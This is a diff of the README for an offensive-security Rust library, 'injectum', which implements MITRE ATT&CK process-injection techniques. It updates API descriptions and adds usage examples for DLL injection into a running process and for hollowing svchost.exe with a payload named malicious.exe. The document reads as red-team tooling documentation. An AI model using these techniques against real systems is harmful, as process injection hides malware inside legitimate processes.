@@ -37,7 +37,7 @@ Think of it as the "Lego set" for offensive tradecraft: it provides a structured
 The library is built around a unidirectional data flow: `Builder` $\to$ `Configuration` $\to$ `Factory` $\to$ `Execution`.
 
 ### 1. The Builder Pattern
-The primary entry point is the InjectorBuilder. It provides a fluent interface to construct an immutable injection configuration, ensuring all components (Strategy, Payload, Target) are valid before execution.
+The primary entry point is the `InjectorBuilder`. It provides a fluent interface to construct an immutable injection configuration, ensuring all components (Strategy, Payload, Target) are valid before execution.
 - **Initialization**: `InjectorBuilder::new()` starts the chain.
 - **Validation**: The `build()` method enforces the presence of a strategy and payload.
 - **Execution**: The builder allows immediate execution via `.execute()`.
@@ -48,9 +48,10 @@ Payloads are strongly typed via the `Payload` enum to prevent misuse.
 - **Metadata**: Every payload includes `PayloadMetadata` for OpSec tracking (origin, description) and safety checks (e.g., `safe_sample` flag).
 
 ### 3. Target Abstraction 
-The **Target** enum abstracts the destination.
-- **PID**: Targets a specific process ID (`Target::Pid(u32)`).
-- **None**: For self-injection or strategies that spawn their own targets (`Target::None`).
+The `Target` enum abstracts the destination context.
+- **Pid**: Targets an existing remote process (`Target::Pid(u32)`).
+- **Spawn**: Spawns a new process to act as the target (`Target::Spawn(PathBuf)`).
+- **CurrentProcess**: Targets the injector itself (`Target::CurrentProcess`).
 
 ### 4. Strategy Factory
 Strategies are instantiated at runtime based on the `StrategyType`.
@@ -60,61 +61,71 @@ Strategies are instantiated at runtime based on the `StrategyType`.
 ### 5. The Execution Engine
 The `Injector` serves as the stateless runner.
 - **Pre-flight Checks**: Validates compatibility (e.g., does the strategy require a PID?).
-- **Error Propagation**: Returns `Result<(), InjectumError>` for granular error handling.
+- **Error Propagation**: Returns `Result<(), Error>` for granular error handling.
 
 ## How It Works
+Each technique has a more complete example associated with it in the `examples/` folder of the repository.
 
-### Basic Usage with `Injector`
+### Example 1: Classic DLL Injection (T1055.001)
+This example targets an existing process ID.
+
 ```rust
-use injectum::{Injector, Payload, PayloadMetadata, StrategyType, Target, Technique};
+use injectum::{
+    InjectorBuilder, Payload, PayloadMetadata, Target, Technique,
+    method::DynamicLinkLibrary
+};
 use std::path::PathBuf;
 
-fn main() {
+fn main() -> injectum::Result<()> {
     // 1. Define the payload
     let payload = Payload::DllFile {
-        path: Some(PathBuf::from("C:\\temp\\payload.dll")),
-        image: None,
-         meta: PayloadMetadata::default(),
+        file_path: Some(PathBuf::from("C:\\temp\\payload.dll")),
+        image_bytes: None,
+        metadata: PayloadMetadata::default(),
     };
-    
-    // 2. Define the target
-    let target = Target::Pid(1234);
-    
-    // 3. Select the strategy (T1055.001 -> "DLLInjection")
-    let strategy = StrategyType::new(Technique::T1055_001, Some("DLLInjection"));
 
-    // 4. Run
-    match Injector::run(strategy, &payload, &target) {
-        Ok(_) => println!("Injection succeeded."),
-        Err(e) => eprintln!("Injection failed: {:?}", e),
-    }
+    // 2. Configure the technique
+    let technique = Technique::T1055_001(DynamicLinkLibrary::Classic);
+
+    // 3. Build and Execute targeting a PID
+    InjectorBuilder::new()
+        .target(Target::Pid(1234))
+        .payload(payload)
+        .technique(technique)
+        .execute()?;
+
+    Ok(())
 }
 ```
 
-### Using the Builder API
+### Example 2: Process Hollowing (T1055.012)
+This example spawns a new process and replaces its memory.
+
 ```rust
-use injectum::{InjectorBuilder, Payload, PayloadMetadata, StrategyType, Target, Technique};
+use injectum::{
+    InjectorBuilder, Payload, PayloadMetadata, Target, Technique,
+    method::ProcessHollowing
+};
+use std::path::PathBuf;
 
-fn main() {
-    let payload = Payload::DllFile {
-        path: Some(PathBuf::from("C:\\temp\\payload.dll")),
-        image: None, 
-        meta: PayloadMetadata {
-            description: Some("Production Payload".into()),
-            safe_sample: false,
-            ..Default::default()
-        }
-    };
+fn main() -> injectum::Result<()> {
+    // 1. Load payload (Auto-detects format)
+    let payload = Payload::from_file(
+        "C:\\temp\\malicious.exe",
+        PayloadMetadata::default()
+    )?;
 
-    let result = InjectorBuilder::new()
-        .strategy(StrategyType::new(Technique::T1055_001, Some("DLLInjection")))
+    // 2. Configure the technique (Standard Hollowing)
+    let technique = Technique::T1055_012(ProcessHollowing::Standard);
+
+    // 3. Build and Execute targeting a new process
+    InjectorBuilder::new()
+        .target(Target::Spawn(PathBuf::from("C:\\Windows\\System32\\svchost.exe")))
         .payload(payload)
-        .target(Target::Pid(1234))
-        .execute();
+        .technique(technique)
+        .execute()?;
 
-    if let Err(e) = result {
-        eprintln!("Injection failed: {:?}", e);
-    }
+    Ok(())
 }
 ```
 
@@ -126,7 +137,7 @@ cargo add injectum
 
 Or add the following line to your `Cargo.toml`:
 ```toml
-injectum = "0.1.0"
+injectum = "0.2.0"
 ```
 
 ## Build Instructions
@@ -158,17 +169,17 @@ cargo xwin build --example T1055_001_DLL_Injection --features "tracing,T1055_001
 ## Roadmap - MITRE ATT&CK Process Injection (T1055)
 Injectum aims to provide a modular, feature‑gated implementation of the full set of process‑injection techniques referenced in the [MITRE ATT&CK framework](https://attack.mitre.org/techniques/T1055/).
 
-| ID | Name |Status | 
+| ID | Technique Name |Implemented Methods | 
 | :--- | :--- | :--- |
-| [T1055.001](https://attack.mitre.org/techniques/T1055/001/) | Dynamic-link Library Injection | [x] |
-| [T1055.002](https://attack.mitre.org/techniques/T1055/002/) | Portable Executable Injection | [ ] |
+| [T1055.001](https://attack.mitre.org/techniques/T1055/001/) | Dynamic-link Library Injection | `Classic` |
+| [T1055.002](https://attack.mitre.org/techniques/T1055/002/) | Portable Executable Injection | `RemoteThread` |
 | [T1055.003](https://attack.mitre.org/techniques/T1055/003/) | Thread Execution Hijacking | [ ] |
-| [T1055.004](https://attack.mitre.org/techniques/T1055/004/) | Asynchronous Procedure Call | [ ] |
+| [T1055.004](https://attack.mitre.org/techniques/T1055/004/) | Asynchronous Procedure Call | `Sniper`, `Spray`, `EarlyBird` |
 | [T1055.005](https://attack.mitre.org/techniques/T1055/005/) | Thread Local Storage | [ ] |
 | [T1055.008](https://attack.mitre.org/techniques/T1055/008/) | Ptrace System Calls | [ ] |
 | [T1055.009](https://attack.mitre.org/techniques/T1055/009/) | Proc Memory | [ ] |
 | [T1055.011](https://attack.mitre.org/techniques/T1055/011/) | Extra Window Memory Injection | [ ] |
-| [T1055.012](https://attack.mitre.org/techniques/T1055/012/) | Process Hollowing | [ ] |
+| [T1055.012](https://attack.mitre.org/techniques/T1055/012/) | Process Hollowing | `Standard`, `EntryPointStomping` |
 | [T1055.013](https://attack.mitre.org/techniques/T1055/013/) | Process Doppelgänging | [ ] |
 | [T1055.014](https://attack.mitre.org/techniques/T1055/014/) | VDSO Hijacking | [ ] |
 | [T1055.015](https://attack.mitre.org/techniques/T1055/015/) | ListPlanting | [ ] |
